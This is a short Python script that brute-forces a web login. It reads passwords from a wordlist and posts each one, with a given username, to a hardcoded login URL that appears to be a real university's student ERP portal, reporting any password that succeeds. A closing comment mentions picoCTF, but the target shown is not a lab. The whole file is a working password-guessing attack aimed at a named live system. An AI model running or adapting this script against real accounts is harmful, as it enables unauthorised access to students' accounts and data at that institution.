import requests
import argparse


parser = argparse.ArgumentParser()
parser.add_argument('--username','-u', type=str, required=True)
parser.add_argument('--wordlist','-w', type=str, required=True)

args = parser.parse_args()


username = args.username

wordlists_path = args.wordlist
url = 'https://erp.gctu.edu.gh/sip/auth/login.php'



#reading wordlist file
with open(wordlists_path) as wordlists:
    try:
        for passwd in wordlists:
            data = {'username':username, 'password':passwd}
            r = requests.post(url, data=data)
            if r.text == 'ok':
                print("Password found:%s" %(passwd))
                break
            else:
                print("checking %s with username:%s and password:%s" %(url, username, passwd) )
    except KeyboardInterrupt:
        print("[+]Quitting... ")



#https://play.picoctf.org/login